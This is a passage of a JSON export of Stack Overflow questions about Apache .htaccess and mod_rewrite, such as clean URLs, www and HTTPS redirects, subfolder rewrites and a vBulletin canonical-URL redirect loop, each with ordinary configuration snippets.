link.</p>\n"},{"tags":["wordpress",".htaccess","apache2","http-basic-authentication","apache-modules"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":12543883,"title":"Apache mod-auth-mysql with phpass encrypted password (Wordpress)","body":"<p>I need to have password protection on some web pages outside of the main Wordpress site. The users would prefer to use the usernames and passwords they already have in the Wordpress.</p>\n\n<p>The obvious solution would seem to be to use the Apace module for Mysql based authentication: mod-auth-mysql.</p>\n\n<p>This however does not seem to be possible, because Wordpress uses Phpass password encryption, which is not supported by mod-auth-mysql.</p>\n\n<ul>\n<li><a href=\"http://modauthmysql.sourceforge.net/CONFIGURE\" rel=\"nofollow\">http://modauthmysql.sourceforge.net/CONFIGURE</a></li>\n<li><a href=\"http://www.openwall.com/phpass/\" rel=\"nofollow\">http://www.openwall.com/phpass/</a></li>\n<li><a href=\"http://wordpress.stackexchange.com/questions/32004/how-to-validate-wordpress-generated-password-in-db-using-php\">http://wordpress.stackexchange.com/questions/32004/how-to-validate-wordpress-generated-password-in-db-using-php</a></li>\n</ul>\n\n<p>Is there any way to get around this limitation?</p>\n"},{"tags":[".htaccess","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12541523,"title":"How to enable virtual subdomain Symfony2.1?","body":"<p>Good afternoon,</p>\n\n<p>I am new to Symfony2.1 framework and trying to make virtual subdomain using .htaccess file in web/ directory.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>    &lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    Options +FollowSymLinks\n    RewriteBase /\n\n    RewriteCond %{HTTP_HOST} !^www.local-biznab.com [NC]\n    RewriteCond %{HTTP_HOST} ^(www.)?([^.]+).local-biznab.com$ [NC]\n    RewriteRule ^([^.]+)$ /var/www/biznab/Symfony/web/app_dev.php/$1?subdomain=%2 [L,QSA]\n    &lt;/IfModule&gt;\n</code></pre>\n\n<p>If there any other way doing this kindly mention.</p>\n\n<p>Thank you</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12534523,"title":"can't remove index.php with .htaccess","body":"<p>i have installed codeigniter and i want to remove the index.php from url when i access localhost/aplication/index.php. i have set uncomment mod_rewrite.so from httpd.conf en this is my .htaccess file :</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>its succes when i acces url from localhost/aplication/index.php/data/users/12 but not with this url localhost/aplication/data/users/12.</p>\n\n<p>how can i fix this??</p>\n"},{"tags":["php",".htaccess","redirect","dynamic"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12540809,"title":"In .htaccess, how do you 301-redirect dynamic pages?","body":"<p>In .htaccess, how do you 301-redirect dynamic pages?</p>\n\n<p>For example, what if I wanted a rule that made <code>www.domain.com/SomeFolder/theThing</code> redirect to <code>www.domain.com/theThing</code>?</p>\n\n<p>I just want to remove the <code>/folder</code> and keep everything else. I already tried but no success.</p>\n\n<p>EDIT:</p>\n\n<p>I'm going to try be clearer. I have: </p>\n\n<ol>\n<li>www.domain.com/SomeFolder/theThing</li>\n<li>www.domain.com/SomeFolder/AnotherThing</li>\n<li>www.domain.com/SomeFolder/AndOneMoreThing</li>\n<li>..and etc etc.</li>\n</ol>\n\n<p>I want to remove this <code>SOMEFOLDER</code> because all those links were moved to index. But there's a lot of them and I was thinking about doing it automatically using dynamic redirect 301.</p>\n"},{"tags":["http",".htaccess","https","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":330,"score":0,"question_id":4403534,"title":"Force HTTPS request using .htaccess","body":"<p>I have a folder with images, which should be accessed only using HTTPS. How to redirect all requests from HTTP to HTTPS?</p>\n"},{"tags":[".htaccess","url","url-rewriting","facebook-like","vbulletin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12504206,"title":"Like Button, vBulletin and Mod Rewrite","body":"<p>I'm having a really, really, really weird problem on my vBulletin board using Facebook's Like Button. In my thread template I'm using the following code, which is located inside body tag:</p>\n\n<pre><code>&lt;td class=\"vbs_forumdata alt1\"&gt;\n    &lt;div id=\"fb-root\"&gt;&lt;/div&gt;\n        &lt;script type=\"text/javascript\"&gt;(function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(d.getElementById(id))return;js=d.createElement(s);js.id=id;js.src=\"//connect.facebook.net/en_US/all.js#xfbml=1\";fjs.parentNode.insertBefore(js,fjs)})(document,\"script\",\"facebook-jssdk\");&lt;/script&gt;\n        &lt;div id=\"thread_sharing_content_facebook\"&gt;\n            &lt;div class=\"fb-like\" data-href=\"{vb:raw sharingurl}\" data-layout=\"button_count\" data-send=\"false\" data-show-faces=\"false\" data-width=\"90\"&gt;&lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/td&gt;\n</code></pre>\n\n<p>As soon as the template is processed by the vBulletin engine, the variable {vb:raw sharingurl} is replaced by the thread's canonical URL, that looks like this:</p>\n\n<pre><code>http://MYDOMAIN/threads/THREADID-THREADTITLE\n</code></pre>\n\n<p>For example:</p>\n\n<pre><code>http://www.mydomain.com/threads/1-Hello-Community\n</code></pre>\n\n<p>Looking at the HTML source of a thread page, everything seems to work as intended:</p>\n\n<pre><code>&lt;td class=\"vbs_forumdata alt1\"&gt;\n    &lt;div id=\"fb-root\"&gt;&lt;/div&gt;\n        &lt;script type=\"text/javascript\"&gt;(function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(d.getElementById(id))return;js=d.createElement(s);js.id=id;js.src=\"//connect.facebook.net/en_US/all.js#xfbml=1\";fjs.parentNode.insertBefore(js,fjs)})(document,\"script\",\"facebook-jssdk\");&lt;/script&gt;\n        &lt;div id=\"thread_sharing_content_facebook\"&gt;\n            &lt;div class=\"fb-like\" data-href=\"http://www.mydomain.com/threads/1-Hello-Community\" data-layout=\"button_count\" data-send=\"false\" data-show-faces=\"false\" data-width=\"90\"&gt;&lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/td&gt;\n</code></pre>\n\n<p>But then, if I click on the Like Button to share the thread page... here comes the drama:</p>\n\n<p><img src=\"http://i.stack.imgur.com/2EFtf.jpg\" alt=\"Drama\"></p>\n\n<p>The original URL of the thread page is messed up transformed into something like:</p>\n\n<pre><code>http://MYDOMAIN/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/THREADID-THREADTITLE\n</code></pre>\n\n<p>Anyone knows why I'm getting that strange problem? The only thing I was thinking about trying to figure it out by myself, is my htaccess file which contains some rewrite rules. It's almost the vBulletin default one... but, anyway, here they are:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\n// Block Bad Bots\nRewriteCond %{HTTP_USER_AGENT} [...]\nRewriteRule ^.*$ - [F,L]\n\nRewriteCond %{HTTPS} !=on\nRewriteCond %{HTTP_HOST} !^www\\..+$ [NC]\nRewriteRule ^ http://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^forums/.* forumdisplay.php [QSA]\nRewriteRule ^members/.* member.php [QSA]\nRewriteRule ^threads/.* showthread.php [QSA]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^(?:(.*?)(?:/|$))(.*|$)$ $1.php?r=$2 [QSA]\n\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule ^(.*)$ - [NC,L]\n\nRewriteRule ^(.*)$ - [R=404,L]\n</code></pre>\n\n<p><strong>EDIT: I tried using the Facebook URL debugger and...</strong></p>\n\n<p><em>Scrape Information</em></p>\n\n<pre><code>Response Code: 200\nFetched URL: http://www.mydomain.com/threads/1-Hello-Community\nCanonical URL: http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\n</code></pre>\n\n<p><em>Critical Errors That Must Be Fixed</em></p>\n\n<pre><code>Could Not Follow Redirect Path: Using data from http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community because there was an error following the redirect path.\n</code></pre>\n\n<p><em>Errors That Must Be Fixed</em></p>\n\n<pre><code>Too Many Redirects: URL redirected too many times. Please reduce the number of redirects.\n</code></pre>\n\n<p><em>Like Button Warnings That Should Be Fixed</em></p>\n\n<pre><code>Admins And App ID Missing: fb:admins and fb:app_id tags are missing. These tags are necessary for Facebook to render a News Feed story that generates a high click-through rate.\nLike Button Tag Missing: og:title is missing. The og:title meta tag is necessary for Facebook to render a News Feed story that generates a high click-through rate.\nLike Button Tag Missing: og:type is missing. The og:type meta tag is necessary for Facebook to render a News Feed story that generates a high click-through rate.\nLike Button Tag Missing: og:image is missing. The og:image meta tag is necessary for Facebook to render a News Feed story that generates a high click-through rate.\n</code></pre>\n\n<p><em>Open Graph Warnings That Should Be Fixed</em></p>\n\n<pre><code>Inferred Property: The 'og:url' property should be explicitly provided, even if a value can be inferred from other tags.\nInferred Property: The 'og:title' property should be explicitly provided, even if a value can be inferred from other tags.\nInferred Property: The 'og:description' property should be explicitly provided, even if a value can be inferred from other tags.\nInferred Property: The 'og:image' property should be explicitly provided, even if a value can be inferred from other tags.\n</code></pre>\n\n<p><em>Object Properties</em></p>\n\n<pre><code>og:url: http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\nog:type: website\nog:title: #Page Title#\nog:image: \nog:description: #Meta Description#\nog:updated_time: 1348134967\n</code></pre>\n\n<p><em>Redirect Path</em></p>\n\n<pre><code>originale: http://www.mydomain.com/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\nrel=\"canonical\": http://www.mydomain.com/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/threads/1-Hello-Community\n</code></pre>\n\n<p>Final URL is in bold (this is the URL we tried to extract metadata from).</p>\n\n<p>Please, please, PLEASE... help me out!</p>\n"},{"tags":[".htaccess","redirect","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12539713,"title":"htaccess script for clean url in existing site","body":"<p>I need to write a htaccess script to redirect requests to respective pages of my website. Below are few examples - </p>\n\n<pre><code>http://mysite.com/index.php to http://mysite.com/index\n</code></pre>\n\n<p>and</p>\n\n<pre><code>http://mysite.com/somefile.php?id=1&amp;value=something to http://mysite.com/somefile/1/something\n</code></pre>\n\n<p>I can change existing links for redirection, plz help.</p>\n"},{"tags":["php","apache",".htaccess","redirect","apache2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12534394,"title":"uri redirect with domain change","body":"<p>I'm not the best at this but I have to do a redirect</p>\n\n<pre><code>domain1.tld/subfolder/seo/based/uri\n</code></pre>\n\n<p>and i need to redirect to</p>\n\n<pre><code>subd.domain2.tld/seo/based/uri\n</code></pre>\n\n<p>is that possible?</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Forgot to mention, these all dynamic requests. Like:</p>\n\n<pre><code>domain1.tld/forums/forum/2-network-announcements/topic-name-with-id\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12537849,"title":"ModRewrite Ignoring my first rule","body":"<p>I have the following in my htaccess which lies in the public_html/ of my site:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule ^(mailinglist)/.*$ - [L]\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php?url=$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I am not sure this works. When I go to <a href=\"http://www.mysite.com/mailinglist\" rel=\"nofollow\">http://www.mysite.com/mailinglist</a> that is fine and it does not try to do the last rule above. When I go to <a href=\"http://www.mysite.com/mailinglist/login\" rel=\"nofollow\">http://www.mysite.com/mailinglist/login</a> that works too. <a href=\"http://www.mysite.com/mailinglist/campaigns\" rel=\"nofollow\">http://www.mysite.com/mailinglist/campaigns</a> works as well. When it does not work is when I go to <a href=\"http://www.mysite.com/mailinglist/w/1\" rel=\"nofollow\">http://www.mysite.com/mailinglist/w/1</a> it uses the last RewriteRule which is:</p>\n\n<pre><code>RewriteRule ^(.*)$ index.php?url=$1 [QSA,L]\n</code></pre>\n\n<p>How can I make this htaccess completely ignore my /mailinglist directory and anything inside it? In that directory I have a different htaccess which I want that directory to use.</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12538466,"title":".htaccess friendly URl","body":"<p>Can anybody please help me with some URL rewriting?</p>\n\n<p>I had:\n(EXAMPLES)</p>\n\n<pre><code>www.example.com/index.php?page=namepage\nwww.example.com/index.php?page=gallery&amp;topic=nametopic\nwww.example.com/index.php?page=homepage&amp;paging=1\n</code></pre>\n\n<p>I would like to have:</p>\n\n<pre><code>www.example.com/namepage\nwww.example.com/gallery/nametopic\nwww.example.com/homepage/1\n</code></pre>\n\n<p>I have in my htaccess file:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^/]+)/?$ ?page=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^/]+)/([^/]+)?/?$ ?page=$1&amp;topic=$2\n</code></pre>\n\n<p>But it doesnt work very well, because i can write:</p>\n\n<ul>\n<li>www.example.com/index.php?page=namepage (page or whatever)</li>\n<li>www.example.com/?page=namepage (page or whatever)</li>\n<li>www.example.com/namepage/</li>\n<li>www.example.com/namepage (THIS I WANT - no others)</li>\n</ul>\n\n<p>And second problem is:</p>\n\n<ul>\n<li>www.example.com/namepage (OK, i want, we see namepage)</li>\n<li>www.example.com/namepage/whatever (NO OK, i want 404, but we see namepage)</li>\n<li>www.example.com/gallery/topic (OK, i want, we see nametopic)</li>\n<li>www.example.com/whatever/whatever2/whatever3 (OK, i want 404)</li>\n</ul>\n\n<p>VERY THANKS TO ANYBODY.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":744,"score":2,"question_id":7493241,"title":"mod_rewrite - add www","body":"<p>I'm trying to force <code>www</code> for my site address with <code>.htaccess</code>:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^mysite\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.mysite.coml/$1 [R=301,L]\n</code></pre>\n\n<p>If I open <code>mysite.com</code> this working ok - it adds <code>www</code>. It becomes <code>http://www.mysite.com/index.php</code>.</p>\n\n<p>But if I open <code>mysite.com/subpage</code> I redirected to <code>http://www.mysite.com/index.php</code> again, instead of <code>http://www.mysite.com/subpage</code>.</p>\n\n<p>But if I open <code>http://www.mysite.com/subpage</code> I don't get redirect (which is the expected behaviour). </p>\n\n<p>How can I fix this? I would like the redirect all requests to my site to the <code>www</code> subdomain.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12533288,"title":".htaccess combination redirect/ hide subfolder from url AND force insertion of \"www\" to url","body":"<p>I pretty much have this working. My problem is, as soon as I click on any link inside of the site, the subfolder name is added to the url. The modifications I have made to the htaccess file are all in the root directory, the one in the site directory is the standard joomla htaccess file. I am not sure if that is messing it up. Here is an example of the code.</p>\n\n<p>To rephrase, I type the url into the browser \"domain.com\" The htaccess does its' job and changes that to \"www.domain.com\" automatically. I know that it is routing to the subfolder, because I can see the actual site. Then I click on the \"Home\" button as an example. The URL then shown in the address bar is \"www.domain.com/site\"</p>\n\n<pre><code>##### Redirect non-www to www -- BEGIN\nRewriteCond %{HTTP_HOST} !^www\\. [NC]\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R,L]\nRewriteCond %{HTTP_HOST} ^domain.com$\nRewriteRule ^/?(.*)$ http://www.domain.com/$1 [R=301,L]\n##### Redirect non-www to www -- END\n\n##### Subfolder redirect --BEGIN\nRewriteRule ^(.*)$ /site/$1 [L]\nRewriteRule ^(/)?$ site/index.php [L]\n##### Subfolder redirect --END\n</code></pre>\n\n<p>I would be happy to post the entire htaccess file if needed, but I can tell you that through changing these two entries into it, I have gotten the site to where it is now. I have quite a few \"security\" measures in the file. </p>\n\n<p>EDIT:\nI should have put this in from the beginning, this is my attempt to redirect away from direct calls to the index.php. I just noticed that it may be fighting with my other redirect.</p>\n\n<pre><code>##### Redirect index.php to / -- BEGIN\nRewriteCond %{THE_REQUEST} !^POST\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /index\\.php\\ HTTP/\nRewriteCond %{SERVER_PORT}&gt;s ^(443&gt;(s)|[0-9]+&gt;s)$\nRewriteRule ^index\\.php$ http%2://www.domain.com/ [R,L]\n##### Redirect index.php to / -- END\n</code></pre>\n\n<p>EDIT 2:I have been constantly dumping my web cache from my browser for testing. My site seems to be  running very slow right upon first connection and there is almost nothing on it as far as content. Have I added something that is requesting too much?</p>\n"},{"tags":[".htaccess","url","mod-rewrite","seo","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12531362,"title":"Rewrite perl cgi-bin URL's with multiple parameters using .htaccess","body":"<p>I'm working on a PERL site which uses the medoc ecommerce system, and I've found that is spits out really ugly URL's which have no meaning to users or search engines:\n<a href=\"https://www.example.com/cgi-bin/live/ecommerce.pl?site=test.com&amp;dept_id=01&amp;sub_dept_id=01&amp;menu=currency&amp;zone=test\" rel=\"nofollow\">https://www.example.com/cgi-bin/live/ecommerce.pl?site=test.com&amp;dept_id=01&amp;sub_dept_id=01&amp;menu=currency&amp;zone=test</a></p>\n\n<p>I want to rewrite this so it's something simple like <a href=\"https://www.example.com/travel-money/home-delivery\" rel=\"nofollow\">https://www.example.com/travel-money/home-delivery</a></p>\n\n<p>Any ideas how I would go about this? </p>\n\n<p>There are perhaps 50 different cgi-bin URL's each with multiple parameters, and I'd like to rewrite all of them individually.</p>\n\n<p>I came up with two different rewrite rules, but neither worked. I couldn't find any examples with multiple parameters:</p>\n\n<p>Option 1:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteBase /\nRewriteCond %{QUERY_STRING} ^site=test.com&amp;dept_id=01&amp;sub_dept_id=01&amp;menu=currency&amp;zone=test$\nRewriteRule ^/cgi-bin/live/ecommerce.pl https://www.example.com/travel-money/home-delivery [L,R=301]\n</code></pre>\n\n<p>Option 2:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteBase /\nRewriteCond %{QUERY_STRING} ^(.*)test.com&amp;dept_id=01&amp;sub_dept_id=01&amp;menu=currency&amp;zone=ice$\nRewriteRule ^cgi-bin/live/ecommerce.pl$ travel-money/home-delivery? [R=301,L]\n</code></pre>\n\n<p>Thanks,</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12534807,"title":".htaccess mod rewrite not working with directly typing url","body":"<p>I have a website called 303proauto.com and there is a link on it like this:</p>\n\n<pre><code>http://www.proauto1.com/martino.php\n</code></pre>\n\n<p>I needed to have it so the links can be clicked and go to <a href=\"http://www.proauto1.com/martino\" rel=\"nofollow\">http://www.proauto1.com/martino</a> (without the .php extension) so I used the mod rewrite to make this work.</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteCond %{REQUEST_URI} !/$\nRewriteRule (.*) $1\\.php [L]\n</code></pre>\n\n<p>That works correctly.  The problem is that a radio listener may physically TYPE the url such as:</p>\n\n<pre><code>http://www.303proauto.com/martino (without the php extension)\n</code></pre>\n\n<p>But it comes up as 404 error non existing.  </p>\n\n<p>Am I needing to place some sort code on the proauto1.com server too?  I feel like I'm confusing which site needs the mod rewrite... or that maybe both needs it.</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12529673,"title":"Mod Rewrite for Code Igniter","body":"<p>I have a code igniter site that needs to accept incoming links in the format:</p>\n\n<p><a href=\"http://domain.tld/somename.html?id=IDREF\" rel=\"nofollow\">http://domain.tld/somename.html?id=IDREF</a></p>\n\n<p>I need to create a rule for mod_rewrite that rewrites this URL to:</p>\n\n<p><a href=\"http://domain.tld/index.php/controller/somename/IDREF\" rel=\"nofollow\">http://domain.tld/index.php/controller/somename/IDREF</a></p>\n\n<p>I am having trouble writing the rule for the .htaccess file.</p>\n\n<p>I thought this should work:</p>\n\n<pre><code>RewriteCond ${QUERY_STRING} ^(.*\\.html\\?id=.*)$\n\nRewriteRule ^([^/]*)\\.html\\?id=(.*) /index.php/controller/$1/$2 [L]\n</code></pre>\n\n<p>But as I am a bit of a novice at mod_rewrite I can't get it to work.</p>\n\n<p>Just to clarify I want the user to link to this ugly url and get sent to specific controller.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12451148,"title":".htaccess do something else if file not exist","body":"<p>We are using an .htaccess in combination with anchor tags to serve files and conceal the server directory structure. </p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /_docu/clients/$1/$2/$3.pdf [NC,L]\n</code></pre>\n\n<p>For example, all files are stored under <code>/public_html/_docu/clients/</code> and inside that folder are listed all the clients, and then under each client their projects. However, an anchor tag for a file would read only: </p>\n\n<p><code>http://mydomain.com/client-name/proj-name/docname.pdf</code> </p>\n\n<p>(the /_docu/clients/ being omitted - there is a good reason for this). The above .htaccess grabs the <code>client-name</code>, <code>proj-name</code> and <code>docname</code> and serves it from the correct folder:</p>\n\n<p><code>http://mydomain.com/_docu/clients/client-name/proj-name/docname.pdf</code></p>\n\n<p>whilst preserving in the address bar the incorrect (concealed) directory structure.</p>\n\n<p><strong>I wish to handle the error condition of a document not existing.</strong> This should never happen, but it could. Can anyone suggest a way of dealing with this? Can something functionally akin to \"if fileexist($1/$2/%3.pdf)\" be somehow constructed in an .htaccess file?</p>\n\n<hr>\n\n<p>EDIT:</p>\n\n<p>Delayed response as JL's answer below required research and experimentation. Thanks, Jon, for the gentle push in the right direction but I haven't got it to work just yet. Here's what I tried:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n# check if the requested file exists in the \"_docu/clients\" directory\nRewriteCond %{DOCUMENT_ROOT}/_docu/clients/$1/$2/$3.pdf -f\nRewriteRule ^([a-z0-9])/([a-z0-9])/([a-z0-9]*).pdf$ /_docu/clients/$1/$2/$3.pdf [NC,L]\nRewriteRule ^(.*)$ /errors/404.php [L]\n</code></pre>\n\n<p>I <em>thought</em> that what that should do is:</p>\n\n<ol>\n<li>If <code>http://mydomain.com/_docu/clients/$1/$2/$3.pdf</code> does not exist,</li>\n<li>GoTo page <code>http://mydomain.com/errors/404.php</code></li>\n</ol>\n\n<p>Actual outcome is an \"internal server error\" message.</p>\n\n<hr>\n\n<p>EDIT TWO:</p>\n\n<p>Latest changes:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} ^/([a-z0-9])/([a-z0-9])/([a-z0-9]*).pdf$\nRewriteCond %{DOCUMENT_ROOT}/_data/cli/%1/%2/%3.pdf -f\nRewriteRule ^([a-z0-9])/([a-z0-9])/([a-z0-9]*).pdf$ /_data/cli/$1/$2/$3.pdf [NC,L]\nRewriteCond %{ENV:REDIRECT_STATUS} !200\nRewriteRule ^(.*)$ /metshare/404.php [L]\n</code></pre>\n\n<p>The problem with this one is that legitimate pages also are directed to 404.php</p>\n\n<p>MESSAGE TO FUTURE READERS:</p>\n\n<p>All of the above concerns were addressed in Jon Lin's final answer. As issues were detected, he modified his answer until it was a perfect, working solution. I am leaving the above as it is because there are some good ULOs within (unscheduled learning opportunities) for those who want to compare versions.</p>\n"},{"tags":["apache",".htaccess","magento","url-rewriting"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":527,"score":2,"question_id":10245032,"title":"URL rewrite, remove .html","body":"<p>I know you guys know this one...we have a website, unfortunately all the URL's have the .html suffix, its a magento installation, magento allows you to change this on the cms, but again, unfortunately all this urls with .html suffix have a good ranking in Google. We need to redirect to non \".html\" .</p>\n\n<p>So, consider the following scenario, we are rebuilding this site from scratch, so we have the same urls on the new site but without the .html suffix. </p>\n\n<blockquote>\n  <p>Now is: www.mysite.de/cool-shoes.html</p>\n  \n  <p>will be:  www.mysite.de/cool-shoes</p>\n</blockquote>\n\n<p>So  www.mysite.de/cool-shoes.html will not exist anymore, and I've been trying a redirect with the .htaccess with no luck. </p>\n\n<p>I've tried so far: </p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /.*\\.html\\ HTTP/\nRewriteRule (.*)index\\.html$ /$1 [R=301,L] \n</code></pre>\n\n<p>and:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^(.*)$ $1.html\n</code></pre>\n\n<p>but it doesn't seem to work...any ideas?</p>\n"},{"tags":["regex",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12534025,"title":"htaccess redirect - use subfolders as parameters","body":"<p>I've been working out an htaccess redirect directive for (example) an online shop.</p>\n\n<p>Products are displayed on product.php, with an ID parameter passed in.</p>\n\n<p>What I'm aiming for is to have </p>\n\n<p><code>products/someValue/someID</code></p>\n\n<p>map to </p>\n\n<p><code>product.php?param1=someValue&amp;param2=someID</code></p>\n\n<p>Here's where I'm at so far. This mostly works, but a couple of things are not quite what I want. I need it to basically separate everything after <code>products/</code> by forward slashes and use each of those as a parameter, regardless of how many or few. also, a trailing slash is optional - my rule throws a 404 if it's not included. Can anyone point me in the right direction? </p>\n\n<pre><code>RewriteRule ^products/(.*)/(.*)/.*$ /product.php?param1=$1&amp;param2=$2\n</code></pre>\n"},{"tags":["wordpress",".htaccess","rewrite","admin"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":239,"score":1,"question_id":8602399,"title":"Allow multiple IPs to access Wordpress Site Admin via .htaccess","body":"<p>I currently have a wordpress site that is being upgraded and I have a maintenence redirect setup in the .htaccess file.</p>\n\n<p>I can allow my own IP access the site and admin but how can I allow multiple IPs access for the other editors to also have access.</p>\n\n<p>I'm currently using :\n    <pre>\n     \n     RewriteEngine on\n     RewriteCond %{REMOTE_HOST} !^123.456.789.101\n     #RewriteCond %{REMOTE_ADDR} !^123.456.789.101\n     RewriteCond %{REQUEST_URI} !/maintanence.html$ [NC]\n     RewriteCond %{REQUEST_URI} !.(jpe?g?|png|gif) [NC]\n     RewriteRule .* /maintanence.html [R=302,L]\n    \n    </pre></p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12460090,"title":"url rewrites dynamic urls redirects - Magento","body":"<p>I'm looking for htaccess lines that do the following</p>\n\n<p>Redirect old existing urls to new url (301)</p>\n\n<p>Example\nwww.example.com/categorya/categoryb/product.htm</p>\n\n<p>TO </p>\n\n<p>www.example.com/product.htm </p>\n\n<p>There can be more category parts, or less, it all has to go to /product.htm (Magento).</p>\n\n<p>Who can help?</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":12532580,"title":"Redirect with addding php 